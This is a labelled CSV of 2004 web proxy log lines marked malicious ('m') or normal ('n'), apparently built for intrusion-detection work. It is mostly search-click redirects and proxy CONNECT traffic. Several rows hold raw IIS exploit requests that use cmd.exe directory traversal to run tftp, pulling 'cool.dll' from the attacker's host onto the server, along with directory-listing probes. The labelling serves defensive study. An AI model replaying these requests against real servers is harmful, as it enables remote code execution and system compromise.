rowIndex, row, class
1212, 24.201.201.176 - - [10/Mar/2004:01:39:12 -0500] "GET http://www.ropile.com/index.php?q=NVDbSsUwEPwVCZgXaU+ubZJDEBEE3/2BPWmq4fQSk1YU8d9NW4UEdmdmh9kFo8x3NtygHDp0zqY1iGspCSVbJw16X3362mpaqOcprwkm528e5zHCtBPMoBB3RbFpVC1UTUlTvt5AYZDvD+8ipDtWdJcN6gypCaGyQMqgNfs0wej/pgQMAzoYNwR3XdPeMlps3pYlmtPpA3am9jEM81K7eTwdAOT4eX+14T/unTvi4ovlhOBojwmcbZpL5XGcs+V4sUzga+is6LiQkqmqYRQq4XpZadk3lVBC90oRwfsL9tEyXM5muXai7RtfQdsVDSO0AuBQ6V4qAMk7ojUe7B76lj2V9zD6FBxML37wrwnGLfq2XFOO9RlDKjcIhpJWaUK50OefXw== HTTP/1.1" 302 0 "http://www.ropile.com/" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", m
1213, 68.48.142.117 - - [10/Mar/2004:01:39:12 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1214, 24.201.201.176 - - [10/Mar/2004:01:39:12 -0500] "GET http://vaclick.epilot.com/click.aspx?k=insurance+company&b=300&p=epilot&s=ropile&pos=3&t=24&kid=4d345528-621a-4cf5-95f6-4849f88043fb&ep=2&sid=39c47f6e-a7d6-4201-aa3a-9f58aa53d099&l=http:%2F%2FAmericanTelegram.com HTTP/1.1" 302 271 "http://www.ropile.com/" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
1215, 24.201.201.176 - - [10/Mar/2004:01:39:13 -0500] "GET http://americantelegram.com/ HTTP/1.1" 200 23400 "http://www.ropile.com/" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
1216, 203.121.182.144 - - [10/Mar/2004:01:39:44 -0500] "CONNECT 198.65.164.28:25 HTTP/1.0" 200 - "-" "-", n
1217, 212.160.136.163 - - [10/Mar/2004:01:39:44 -0500] "GET http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=auto+parts HTTP/1.0" 200 55267 "http://www.gemini.dogs.homerescue.org/" "Mozilla/4.75 [en] (WinME; I)", n
1218, 61.237.215.17 - - [10/Mar/2004:01:39:53 -0500] "GET http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi HTTP/1.0" 200 2038 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)", n
1219, 212.160.136.163 - - [10/Mar/2004:01:39:58 -0500] "GET http://www.searcheaven.net/cgi-bin/smartsearch/sf.cgi?t=xm&keys=sfadazsnaispacsksozpzcsxskaxazshavavssadapzpahsphvscspaahfafsihhhmsmszsvhnaasosshnaohozchzanshssakaihzsaavzyzczyanadssafahanaascaizmsnaszzszsfacapaasmhxzoaisiszhnakzzaxavassaamzszyaxahahaascshzdzyadaaszsizdsaaashshanzvzzaisoaxscshafsasoaszmzcsaassvsdaoavszsksyzvzaazafszazacafapasanzhzhaasmafsnshspapsoadzahsaiayaxadacsvapafanhxhospanszsmshavahacsnzazcaisyszayacacapsoanzvzcsaassysmssafsashafzazdaiaxaxahsaaasxsoadzhhosfadapsnakspsaacsozphvsdassyahacaoapahashczksdadafasamafansoskzazkaisnsiskacavavacsohchmsnsyaxasaaskshskschzhfazscszaysaaiafsyanhyzcszansysdshaaanshaszazpazasaaahaksisxsksmzpzksxasadsmsdsksfshschfzmsdafaasdsdadavsysozvzcasassdsmadskaososchfzzsasnadscacsxapsoanhahvsaassssnaoskayskaihczdsascadazacafsashsohczcaaasaxazsnaaafshsnzazvazskadsvsdadshsssyzphmadasazazaiavapacsohzhmazaiszadsaafsxafanhchosxassksdsdsiaysoafzahmsdaoadsmsaspshavsozihmsxsoapsmscaaahsoanhfhmsxafsyahsdakshavanzpzcadsyadacsdsiafacsnhchnsasoaaazaksisxsasohzhoavasszazsdskayshaszvhmsdahadskacakafasanzihoaiansvsmakaaaoafsnhzhfaysosyacaksiapahsyhozhayasszacspafsfacskzvzvaiaoaxayaospapsnsmzphoassyapacacsiaysoadhfzhaianaxscacacapacsyzkhvayanafsmaosisisoaxhzzzaismsysxakacshsnsyhzzcszanaxazaiskafafsozahksasmadadacadshadsohfzcsxassssdaoavafafsyhzzvsasosiacaksxsxshsozmzcsdansyacamavavsoashchoayasszsnaksxavsnsmhxhvsdsmafsdakaasishadhczpayaxaxsmsdsysaadadzizcsnsoazacakaaaoacsyhzzcazscaaasacadshacadhazkasansvsdshaasishadzvzkazsksiahsasyshahsozhhvsfassmsmscspanshaszahmazsnsiszacspavavadzizkakansksnaaspsishahzahvsaahaxsmakaasxspadzchoazsyssasscspapsosyzphnaysnsisxsdsyshahsyzzzcaaasszsmakafsfafaszvhfsxsosyadakaaavspsmhchoassoaaacspspsxacafzphmsxsnaxsxaospsashsmhxhosasmsmasafafahacsnzpzpsxaxaasdsaspshssadzmzhaismszsnsdafsxacanzphmayasaxscshaksaavsmhozhavsmaaasscspapacaohfahspzasaasadhaaaaasmzszphoszssahhksoaisfsizkhpaxsxanskhyhszkssavzshozysxsxsohcsmahahschxzpsnaahydzfchvzzhfzksvanzysyazsp&kw=auto+parts HTTP/1.0" 302 1169 "http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=auto+parts" "Mozilla/4.75 [en] (WinME; I)", m
1220, 68.48.142.117 - - [10/Mar/2004:01:40:02 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1221, 212.160.136.163 - - [10/Mar/2004:01:40:03 -0500] "GET http://xmlrevenue.com/other.php?k=hphahihfhxzmhmhnhphazfzshfzfzshazyzpdhdsfvhozihnzohvhfhchshhzohihfzyhfhmfffohdhvzaaizfhmaadizaasapapdidcfoaizczdaahihodshnzvfaaahxfdsxskhnzysysxzmzhsnaisfsasyhiavacdofidcdcacssazskahsxsosizhdyshfksafdhvaafifmaxzchcfahvzodzskaaschddchxzkazsazhdaazsxfzsdayfsfkafaffnfddsszsoahahfcdysidhfisfdsdydhsiafdxdvaozhayfvakfzacszdvdhavsphsazhzaxfsfkdohzhxahzmhpanachizmfsazzmdiafafzfzmfidvaaaxsahxsfsnsxdxdfaasxdfdsaxhffoffadfffcdihsfffddnazsmdnfczyhfhsanaiakfhfxfmdhdadpdfsyaxffsyahhdsdfzdisosfffhasydianfzdpdyfydcsnsissakdhapadfshzsddkfxdozxdzzoafdisaakspdifyhkavdpanaoaafyzyfsfydphksidfadahszhzffacfasosasyahszsiaksyspdmsksmfkzddnhhdmfdfhzssxaiasscayzxhczdsdaiaosczaddzfhhhazkzchozafadchvaxsyshzcazafaasaavsmsdaasihnshasskhcsdaisihnakszaahhzchpzosfazsdsysvadzcszsxafayaahzhphfayassdad&u=search123&a=searcheaven&keywords=auto%20parts&gen=xmlfeed&gto=zpzshdhchazfzohyzizc HTTP/1.0" 302 0 "http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=auto+parts" "Mozilla/4.75 [en] (WinME; I)", m
1222, 212.160.136.163 - - [10/Mar/2004:01:40:04 -0500] "GET http://click.search123.com/cgi-bin/clickthru.cgi?EI=53503&Q=auto%20parts&NGT=Z8BzwYitxjrfxidVpL5odqAq+NAS+KzhzNk8XXiigTf+C0NBXk5SjzVihjvCXUSYzTa7ShdGDk2fxHxtTNCFBCLivp14+DQpnPOQ4XMWsLY4fTAbqVInyh+vowKW/5amV0hS/+wc/0g10WEUo/h6aaVDdzRkZu9hYYfwDUYwLAzLOovrdXOAirEUwkRncS9vn56C7dzsN68T21xPLw8RrLlJ0jyndluupZJWLnr4mmpmy27bm49upG+lG29I9+z+3tYCKzsk4Tc=&x=1&IP=192.168.1.103&UID=39593 HTTP/1.0" 302 361 "http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=auto+parts" "Mozilla/4.75 [en] (WinME; I)", n
1223, 212.160.136.163 - - [10/Mar/2004:01:40:05 -0500] "GET http://www.looksmart.com/og/pr=Psr;ro=5;rc=7;la=30183;lm=84862;kw=3143084;ed=20031223;ii=8072.6d3d.404eb829.6f9b;pn=;to=;tc=7;po=5;pc=10;pi=pza4;ts=%7Chttp://www.racing-seats-usa.com/ HTTP/1.0" 302 212 "http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=auto+parts" "Mozilla/4.75 [en] (WinME; I)", n
1224, 212.160.136.163 - - [10/Mar/2004:01:40:06 -0500] "GET http://www.racing-seats-usa.com/ HTTP/1.0" 200 9283 "http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=auto+parts" "Mozilla/4.75 [en] (WinME; I)", n
1225, 61.237.215.17 - - [10/Mar/2004:01:40:27 -0500] "GET http://99seek.com/search.php?ID=107&fString=Car+Rentals HTTP/1.0" 302 0 "http://www.yanshi.cc/ys01/ys0100006/index-3-7.htm" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 95)", n
1226, 61.237.215.17 - - [10/Mar/2004:01:40:28 -0500] "GET http://99seek.com/search_results.php?fSearch_id=38abeb2bf0d1b025&fString=car+rentals HTTP/1.0" 200 6548 "http://www.yanshi.cc/ys01/ys0100006/index-3-7.htm" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 95)", n
1227, 61.237.215.17 - - [10/Mar/2004:01:40:30 -0500] "GET http://99seek.com/redirect.php?fID=10597268 HTTP/1.0" 302 0 "http://99seek.com/search_results.php?fSearch_id=38abeb2bf0d1b025&fString=car+rentals" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 95)", n
1228, 61.237.215.17 - - [10/Mar/2004:01:40:31 -0500] "GET http://xml.seek99.com/go2.htm?a=%CB%9D%C3%19U&bid=aascaaafaxaz&url=http%3A%2F%2Fpartners.mygeek.com%2Fpresults.jsp%3Fpartnerid%3D98607%26vendorId%3D82212%26type%3D5%26code%3D1%26rate%3D543362362%26cr%3D543362362%26domain%3Dwww.2020search.com%26query%3D1078900826570%253A%253A66.70.88.60%253A%253Acar%2Brentals%26url%3Dhttp%253A%252F%252Fwww.2020search.com%252Ftoolbar%252Finstall.html%253FKeywords%253Dcar%252520rentals&valsearch=1 HTTP/1.0" 200 566 "http://99seek.com/search_results.php?fSearch_id=38abeb2bf0d1b025&fString=car+rentals" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 95)", m
1229, 68.48.142.117 - - [10/Mar/2004:01:40:52 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1230, 68.48.142.117 - - [10/Mar/2004:01:40:53 -0500] "GET /c/httpodbc.dll HTTP/1.0" 404 282 "-" "-", m
1231, 24.235.131.196 - - [10/Mar/2004:01:40:58 -0500] "GET http://www.youngvagina.com/iframe.php HTTP/1.0" 502 539 "http://www.youngvagina.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1232, 68.48.142.117 - - [10/Mar/2004:01:41:43 -0500] "GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
1233, 192.117.242.67 - - [10/Mar/2004:01:41:51 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1234, 12.221.212.151 - - [10/Mar/2004:01:41:51 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.0 ( compatible; MSIE 5.5; Windows 98; DigiExt )", n
1235, 12.221.212.151 - - [10/Mar/2004:01:41:52 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.7 ( compatible; [fr]; Windows 98; athome020 )", n
1236, 68.48.142.117 - - [10/Mar/2004:01:42:33 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1237, 212.160.136.163 - - [10/Mar/2004:01:43:07 -0500] "GET http://www.1000search.com/?username=zbrown HTTP/1.0" 200 22149 "http://www.powerlift.ifbbpro.net/" "Mozilla/4.0 (compatible; MSIE 5.02; Windows ME)", n
1238, 212.160.136.163 - - [10/Mar/2004:01:43:12 -0500] "GET http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=capital HTTP/1.0" 200 18009 "http://www.bodybuilding.powerlifting.ifbbpro.net/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)", n
1239, 212.160.136.163 - - [10/Mar/2004:01:43:15 -0500] "GET http://clickcheaper.com/go.php?b=zhhazozyzxhchc&k=svsiafsmazacac&u=snskansososkayaiad&l=spssshhdasspakazsmanacamadfmhcxnsicpzazhavapakaaazhaadzhhoahhyavaxavzzhczczpzzzshhaczzhfhszzsozszvcofocahshfsvsozyhiszasaahczvzvzmzcsmhhsaazadzcazsfsnzfzizfshsyzcamakddxvfvhxzozyzpziacaianzchhachcsnszsmsxhohfsxzpzdhhhdhizozczmzkskzkhzdfcyfvsmzfsmsmsahyzphfzcssaxzcakzosxafakzzzzzsaaapshhyakshsnhmaassacfydvchsfzzavsxaxzfzkzphahszzsvzzahhysmspsihdzozxzihxhvafzzshsxadhkaodddnfksxaaspzssahmzfzmzkznsvsdsvssaoanhyanaxsohvayszaosmaiazhdaxafskxfxscfsxanaosn&s=axsssismazfp&t= HTTP/1.0" 302 0 "http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=capital" "Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)", m
1240, 212.160.136.163 - - [10/Mar/2004:01:43:21 -0500] "GET http://clickcheaper.com/go.php?u=snskansososkayaiad&l=spssshhdasspakazsmanacamadfmhcxnsicpzazhavapakaaazhaadzhhoahhyavaxavzzhczczpzzzshhaczzhfhszzsozszvcofocahshfsvsozyhiszasaahczvzvzmzcsmhhsaazadzcazsfsnzfzizfshsyzcamakddxvfvhxzozyzpziacaianzchhachcsnszsmsxhohfsxzpzdhhhdhizozczmzkskzkhzdfcyfvsmzfsmsmsahyzphfzcssaxzcakzosxafakzzzzzsaaapshhyakshsnhmaassacfydvchsfzzavsxaxzfzkzphahszzsvzzahhysmspsihdzozxzihxhvafzzshsxadhkaodddnfksxaaspzssahmzfzmzkznsvsdsvssaoanhyanaxsohvayszaosmaiazhdaxafskxfxscfsxanaosn&k=svsiafsmazacac&b=zhhazozyzxhchc&s=axsssismazfp&x=&t=&tw=&f=c0beb3a42f2f1bf3125613b3d6a8de63 HTTP/1.0" 302 0 "http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=capital" "Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)", m
1241, 212.160.136.163 - - [10/Mar/2004:01:43:22 -0500] "GET http://www.1000search.com/search.php?keywords=Incorporation&username=zbrown HTTP/1.0" 200 21422 "http://www.1000search.com/?username=zbrown" "Mozilla/4.0 (compatible; MSIE 5.02; Windows ME)", n
1242, 212.160.136.163 - - [10/Mar/2004:01:43:23 -0500] "GET http://www.epilot.com/click.aspx?k=capital&b=1400&p=epilot&s=seeky&pos=1&t=0&kid=bd0b06f3-9085-47e0-bbed-1fa05e57523d&ep=1&sid=b022ac98-86cf-49e0-8c96-9e3837344dfb&l=http:%2F%2Fascticket.com HTTP/1.0" 302 264 "http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=capital" "Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)", n
1243, 68.48.142.117 - - [10/Mar/2004:01:43:23 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1244, 212.160.136.163 - - [10/Mar/2004:01:43:25 -0500] "GET http://www.1000search.com/go.php?b=zzhnhzzkzozh&k=aospasavsoasaxsxasacsisvas&u=aosfszamsian&l=zphohdzvhpzizhhzzizizmhnhxzdsnsxhdhfzxzczyhyhfzdafsdadzfzzzazyhihmaozhzafahdzxhazkdnhahmsvansdfssazcznhpfnzvdzdvaxhfziskfkscfadvhdanaphxsxsfzzamsydifxsxzchdzozxdsavsyzksodnsffisisxazfssmfpafaxayaaffdszpdnfafmfszfaosksdzzdhsfdkzmhmdoamfadszxdsszhfdfsxsiapaasxfsfvfxfhsxahfczczadzakavdffsfihxfsdsazdfshdofkdasmszfxzcacddfaaofifksmavdaaidzapacachkaxayfzaddvfdaxssfhskfpasdzzcfssxasskdydfhyzodhffazsyfcskavamsnsvdzsdfzshdvfkzzdvhhhmsvzizxzazzzsznhsddfyhshsafhozxhaavaiasfysnasssaoacafdfsmdzzozcdmdmsszfzchvaoakamspaafhsfschpfiskszhsfifzachdzxhasvassdaxsxfhadaxzfzchvsoshahamsxavfpdpakzmhpzdzxhaavsdzphmfxzyzodzsmacasznhcsoahshzksxaiahafamsaaxaxavspacayahznsozfscakzaskhvaoshsfhmaisifzhdavsdhaavaxshzpszscskamadskscamsxsfhmakacsfzvhahvacafsdss&tw=zhhahyzkhdzizohdzhzh&s=soapazsoacshasspsxaf&t= HTTP/1.0" 302 0 "http://www.1000search.com/search.php?keywords=Incorporation&username=zbrown" "Mozilla/4.0 (compatible; MSIE 5.02; Windows ME)", n
1245, 212.160.136.163 - - [10/Mar/2004:01:43:27 -0500] "GET http://www.1000search.com/go.php?u=aosfszamsian&l=zphohdzvhpzizhhzzizizmhnhxzdsnsxhdhfzxzczyhyhfzdafsdadzfzzzazyhihmaozhzafahdzxhazkdnhahmsvansdfssazcznhpfnzvdzdvaxhfziskfkscfadvhdanaphxsxsfzzamsydifxsxzchdzozxdsavsyzksodnsffisisxazfssmfpafaxayaaffdszpdnfafmfszfaosksdzzdhsfdkzmhmdoamfadszxdsszhfdfsxsiapaasxfsfvfxfhsxahfczczadzakavdffsfihxfsdsazdfshdofkdasmszfxzcacddfaaofifksmavdaaidzapacachkaxayfzaddvfdaxssfhskfpasdzzcfssxasskdydfhyzodhffazsyfcskavamsnsvdzsdfzshdvfkzzdvhhhmsvzizxzazzzsznhsddfyhshsafhozxhaavaiasfysnasssaoacafdfsmdzzozcdmdmsszfzchvaoakamspaafhsfschpfiskszhsfifzachdzxhasvassdaxsxfhadaxzfzchvsoshahamsxavfpdpakzmhpzdzxhaavsdzphmfxzyzodzsmacasznhcsoahshzksxaiahafamsaaxaxavspacayahznsozfscakzaskhvaoshsfhmaisifzhdavsdhaavaxshzpszscskamadskscamsxsfhmakacsfzvhahvacafsdss&k=aospasavsoasaxsxasacsisvas&b=zzhnhzzkzozh&s=soapazsoacshasspsxaf&x=&t=&tw=zhhahyzkhdzizohdzhzh&f=ee43c5a5ff8b3338ac9182dff65f620d HTTP/1.0" 302 0 "http://www.1000search.com/search.php?keywords=Incorporation&username=zbrown" "Mozilla/4.0 (compatible; MSIE 5.02; Windows ME)", m
1246, 81.215.8.250 - - [10/Mar/2004:01:43:27 -0500] "HEAD http://www.sun.com/ HTTP/1.0" 200 0 "-" "Mozilla/4.0 (compatible; ICS)", n
1247, 203.121.182.142 - - [10/Mar/2004:01:43:33 -0500] "CONNECT 168.226.188.196:25 HTTP/1.0" 500 436 "-" "-", n
1248, 212.160.136.163 - - [10/Mar/2004:01:43:40 -0500] "GET http://ascticket.com/ HTTP/1.0" 200 80023 "http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=capital" "Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)", n
1249, 220.173.17.142 - - [10/Mar/2004:01:43:59 -0500] "GET http://www.cueoo.com//search.php?str=Credit+Cards HTTP/1.1" 200 19634 "http://www.163.net" "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)", n
1250, 220.173.17.142 - - [10/Mar/2004:01:44:00 -0500] "GET http://www.cueoo.com//index.php?mode=rd&id=9&position=10&PPC20=cca3f26e973c7d17a02fa4bf476e1b69 HTTP/1.1" 200 1109 "http://www.cueoo.com//search.php?str=Credit+Cards" "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)", n
1251, 192.117.242.67 - - [10/Mar/2004:01:44:00 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1252, 192.117.242.67 - - [10/Mar/2004:01:44:03 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1253, 68.48.142.117 - - [10/Mar/2004:01:44:13 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1254, 68.48.142.117 - - [10/Mar/2004:01:44:13 -0500] "GET /d/httpodbc.dll HTTP/1.0" 404 282 "-" "-", m
1255, 212.160.136.163 - - [10/Mar/2004:01:44:18 -0500] "GET http://www.searchfeed.com/rd/Clk.jsp?s=wf&k=incorporation&lnk2=rhhE%3F..iy29%27wBAyekxpr%27fsCqvrkh%27pDB.osC.fsCqvrkh%27qAA%3EpAsplhrxDigr%29t%3DH8441%29w%3D8MYnDiJjafrmFxnJI39MPmrpH3JaYsLgoTYsTnd6wobCvQmhUQnHSe3EthJSNdTcRH4ESMrwN%3FilPBHGehblqY4yY3RRaU85KwV0iwu7PHTC6QJhwodGzUuflUjZa0vdY3873eQOvf8ie3bz0TTaEm96oYJ7A242gQizw%7C2%27G4&p=4351&sid=473226&ex=1078900997556 HTTP/1.0" 200 566 "http://www.1000search.com/search.php?keywords=Incorporation&username=zbrown" "Mozilla/4.0 (compatible; MSIE 5.02; Windows ME)", m
1256, 212.160.136.163 - - [10/Mar/2004:01:44:43 -0500] "GET http://seek99.com/search.htm?aid=19448&keywords=freeware HTTP/1.0" 200 13723 "http://www.dogs.homerescue.org/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
1257, 212.160.136.163 - - [10/Mar/2004:01:44:45 -0500] "GET http://seek99.com/go2.htm?a=%CB%8A%7F%C3S&bid=aascaaafaaac&url=http%3A%2F%2Ffeed.genieknows.com%2Fsearch%2Fxml%2FMonitor%3Fenc%3Dwo%2524y%2525uMx%2525%2525%2521J%253F%253F%2523tA%253Ewq%257Cq%2529%2A%2524uq%2523sx%253Es%2B%257D%253Fz%2524Os%257Cys%257BYtM%2521wXZUIt%2522%2525%257C%257B6worytM%2540%253E%2540AH6s%2Bro%2527q%257CM%2540%253E%2540%2540GAIIIIIFI%2540%2540EEHDH6wo%2522%2523%2AMv%2523uu%2528q%2523u6woqvvytMH6woy%2521MFH%253EDH%253EA%2540F%253EA%2540I6wosqsxuM%255E6wos%257CytMcUU%255BIIoHHFI%2501 HTTP/1.0" 200 566 "http://seek99.com/search.htm?aid=19448&keywords=freeware" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", m
1258, 68.48.142.117 - - [10/Mar/2004:01:45:03 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
1259, 203.121.182.140 - - [10/Mar/2004:01:45:04 -0500] "CONNECT 148.246.74.61:25 HTTP/1.0" 500 434 "-" "-", n
1260, 221.7.192.11 - - [10/Mar/2004:01:45:41 -0500] "GET http://www.ccbbs.cn/ HTTP/1.1" 200 15631 "http://www.ccbbs.cn" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
1261, 203.121.182.144 - - [10/Mar/2004:01:45:45 -0500] "CONNECT 202.154.4.25:25 HTTP/1.0" 500 430 "-" "-", n
1262, 203.121.182.145 - - [10/Mar/2004:01:45:50 -0500] "CONNECT 210.242.12.243:25 HTTP/1.0" 200 - "-" "-", n
1263, 212.160.136.163 - - [10/Mar/2004:01:45:51 -0500] "GET http://www.lookportal.com/search/smartsearch.cgi?username=bmocking&keywords=improvement HTTP/1.0" 200 105 "http://www.geminidogs.homerescue.org/" "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)", n
1264, 221.7.192.11 - - [10/Mar/2004:01:45:53 -0500] "GET http://ccbbs.cn/index.asp HTTP/1.1" 200 12711 "http://ccbbs.cn/index.asp" "Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)", n
1265, 68.48.142.117 - - [10/Mar/2004:01:45:54 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1266, 12.221.212.151 - - [10/Mar/2004:01:46:17 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.0 ( compatible; [de]; Windows NT5.0; Compaq )", n
1267, 12.221.212.151 - - [10/Mar/2004:01:46:17 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.7 ( compatible; MSIE 5.01; Windows 95; FREEI v2.53 )", n
1268, 81.215.8.250 - - [10/Mar/2004:01:46:33 -0500] "GET http://n3t.net/cgi-bin/prxjdg-e.cgi HTTP/1.0" 200 1532 "-" "Mozilla/4.0 (compatible; ICS)", n
1269, 12.221.212.151 - - [10/Mar/2004:01:46:35 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.6 ( compatible; [fr]; Windows 95; DigiExt )", n
1270, 192.117.242.67 - - [10/Mar/2004:01:46:43 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1271, 68.48.142.117 - - [10/Mar/2004:01:46:44 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1272, 61.237.215.17 - - [10/Mar/2004:01:46:58 -0500] "GET http://99seek.com/search.php?ID=107&fString=Outdoor+Recreation HTTP/1.0" 302 0 "http://www.yanshi.cc/ys01/ys0100006/index-3-7.htm" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
1273, 61.237.215.17 - - [10/Mar/2004:01:46:59 -0500] "GET http://99seek.com/search_results.php?fSearch_id=17d0b0961ad69403&fString=outdoor+recreation HTTP/1.0" 200 6049 "http://www.yanshi.cc/ys01/ys0100006/index-3-7.htm" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
1274, 61.237.215.17 - - [10/Mar/2004:01:47:04 -0500] "GET http://99seek.com/redirect.php?fID=10597503 HTTP/1.0" 302 0 "http://99seek.com/search_results.php?fSearch_id=17d0b0961ad69403&fString=outdoor+recreation" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
1275, 61.237.215.17 - - [10/Mar/2004:01:47:06 -0500] "GET http://99seek.com/ HTTP/1.0" 200 12068 "http://99seek.com/search_results.php?fSearch_id=17d0b0961ad69403&fString=outdoor+recreation" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
1276, 68.48.142.117 - - [10/Mar/2004:01:47:34 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1277, 203.61.199.98 - - [10/Mar/2004:01:47:35 -0500] "GET http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi HTTP/1.0" 200 2030 "-" "Mozilla/3.0 (compatible)", n
